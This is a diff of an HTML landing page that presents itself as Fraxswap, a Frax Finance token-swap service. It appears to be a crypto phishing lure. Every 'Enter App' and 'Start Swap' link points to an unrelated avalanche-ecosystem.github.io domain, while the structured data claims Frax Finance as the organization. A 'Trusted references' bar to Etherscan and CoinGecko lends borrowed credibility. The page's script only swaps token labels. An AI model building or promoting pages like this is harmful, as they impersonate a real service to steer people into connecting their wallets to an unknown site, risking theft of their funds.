@@ -3,86 +3,177 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Fraxswap</title>
+  <title>Fraxswap &mdash; Clean AMM Trading</title>
   <meta name="description" content="Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.">
   <link rel="canonical" href="https://fraxswap.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F4F6FB">
+  <meta name="theme-color" content="#f7f7f4">
   <meta property="og:type" content="website">
-  <meta property="og:title" content="Fraxswap">
+  <meta property="og:title" content="Fraxswap &mdash; Clean AMM Trading">
   <meta property="og:description" content="Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.">
   <meta property="og:url" content="https://fraxswap.github.io/">
   <meta property="og:image" content="https://fraxswap.github.io/og-cover.png">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Fraxswap">
-  <meta name="twitter:description" content="Swap FRAX and other tokens from your own wallet on the Frax ecosystem.">
+  <meta name="twitter:title" content="Fraxswap &mdash; Clean AMM Trading">
+  <meta name="twitter:description" content="Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
+  <link rel="sitemap" type="application/xml" href="sitemap.xml">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> Fraxswap</a>
-    <nav class="nav" aria-label="Trusted references">
+    <a class="brand" href="https://fraxswap.github.io/" aria-label="Fraxswap home">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Fraxswap</span>
+    </a>
+    <span class="topbar-spacer" aria-hidden="true"></span>
+    <nav class="authority-nav" aria-label="Trusted references">
       <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
       <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
       <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">DeFi guide</a>
     </nav>
-    <span class="sp"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
 
-  <main class="stage">
-    <h1>Fraxswap</h1>
-    <p class="sub"><strong>Fraxswap</strong> swaps FRAX and other tokens from your own wallet on the Frax ecosystem.</p>
-
-    <section class="card" aria-label="Swap route">
-      <div class="route">
-        <div class="leg">
-          <span class="lbl">From</span>
-          <span class="chip">
-            <img class="ic" src="frax.png" width="26" height="26" alt="FRAX">
-            <span class="t">FRAX</span>
-          </span>
+  <main class="page-shell">
+    <section class="hero" aria-label="Fraxswap">
+      <div class="hero-copy">
+        <h1>Fraxswap</h1>
+        <p class="deck"><strong>Fraxswap</strong> swaps FRAX and other tokens from your own wallet on the Frax ecosystem.</p>
+        <div class="trust-chips" aria-label="Fraxswap highlights">
+          <span>TWAMM swaps</span>
+          <span>Non-custodial</span>
+          <span>Best execution</span>
         </div>
-        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
-        <div class="leg">
-          <span class="lbl">To</span>
-          <span class="chip">
-            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
-            <span class="t">ETH</span>
-          </span>
-        </div>
+        <a class="primary-cta hero-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
+          <span>Enter App</span>
+          <span class="cta-arrow" aria-hidden="true">&rsaquo;</span>
+        </a>
       </div>
-      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
-      <p class="note">Preview only &mdash; rates and routes are shown in the app.</p>
-    </section>
-  </main>
 
-  <footer class="foot">
-    <b>Fraxswap</b> &mdash; 2026
-  </footer>
+      <aside class="swap-card" aria-label="Swap preview">
+        <div class="card-chrome">
+          <div class="selector-pill">
+            <span class="selector-dot" aria-hidden="true"></span>
+            <span>ETH / FRAX</span>
+          </div>
+          <span class="preview-pill"><span aria-hidden="true"></span>Preview</span>
+        </div>
+
+        <div class="route" data-route>
+          <div class="token-panel">
+            <span class="panel-label">From</span>
+            <div class="token-row">
+              <img data-from-img src="eth.png" width="30" height="30" alt="ETH">
+              <div class="token-copy">
+                <span data-from-symbol>ETH</span>
+                <small data-from-name>Ethereum</small>
+              </div>
+            </div>
+          </div>
+
+          <button class="switch-button" type="button" aria-label="Switch preview route" data-switch>
+            <span aria-hidden="true">&rarr;</span>
+          </button>
+
+          <div class="token-panel">
+            <span class="panel-label">To</span>
+            <div class="token-row">
+              <img data-to-img src="frax.png" width="30" height="30" alt="FRAX">
+              <div class="token-copy">
+                <span data-to-symbol>FRAX</span>
+                <small data-to-name>Frax</small>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="route-meta" aria-label="Route quality">
+          <span>Best route</span>
+          <span class="hop-dots" aria-hidden="true"><i></i><i></i><i></i></span>
+          <span>App resolved</span>
+        </div>
+        <p class="preview-hint">Preview only &mdash; open the app for live route details from your wallet.</p>
+        <a class="primary-cta card-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
+          <span>Start Swap</span>
+          <span class="cta-arrow" aria-hidden="true">&rsaquo;</span>
+        </a>
+      </aside>
+    </section>
+
+    <div class="texture-band" aria-hidden="true"></div>
+
+    <footer class="footer">
+      <p class="footer-brand">Fraxswap &mdash; 2026</p>
+      <p>Information on this page is for educational purposes only and is not financial advice.</p>
+    </footer>
+  </main>
 
   <script type="application/ld+json">
   {
     "@context": "https://schema.org",
     "@graph": [
-      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "Fraxswap", "inLanguage": "en" },
-      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Frax", "url": "https://avalanche-ecosystem.github.io/", "sameAs": ["https://frax.finance/","https://x.com/fraxfinance","https://github.com/FraxFinance"] },
-      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "Fraxswap", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
+      {
+        "@type": "WebSite",
+        "@id": "https://fraxswap.github.io/#website",
+        "url": "https://fraxswap.github.io/",
+        "name": "Fraxswap",
+        "description": "Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://fraxswap.github.io/#webapplication",
+        "url": "https://avalanche-ecosystem.github.io/",
+        "name": "Fraxswap",
+        "description": "Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "isAccessibleForFree": true,
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://fraxswap.github.io/#organization",
+        "name": "Frax Finance",
+        "url": "https://frax.finance/"
+      }
     ]
   }
   </script>
 
   <script>
-  (function(){
+  (function () {
     "use strict";
-    var root=document, btn=root.querySelector('[data-dir]');
-    if(!btn) return;
-    btn.addEventListener('click', function(){
-      var chips=root.querySelectorAll('.leg .chip');
-      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
+
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    var fromImg = document.querySelector("[data-from-img]");
+    var fromSymbol = document.querySelector("[data-from-symbol]");
+    var fromName = document.querySelector("[data-from-name]");
+    var toImg = document.querySelector("[data-to-img]");
+    var toSymbol = document.querySelector("[data-to-symbol]");
+    var toName = document.querySelector("[data-to-name]");
+
+    button.addEventListener("click", function () {
+      var from = {
+        src: fromImg.getAttribute("src"),
+        alt: fromImg.getAttribute("alt"),
+        symbol: fromSymbol.textContent,
+        name: fromName.textContent
+      };
+
+      fromImg.setAttribute("src", toImg.getAttribute("src"));
+      fromImg.setAttribute("alt", toImg.getAttribute("alt"));
+      fromSymbol.textContent = toSymbol.textContent;
+      fromName.textContent = toName.textContent;
+
+      toImg.setAttribute("src", from.src);
+      toImg.setAttribute("alt", from.alt);
+      toSymbol.textContent = from.symbol;
+      toName.textContent = from.name;
     });
   })();
   </script>
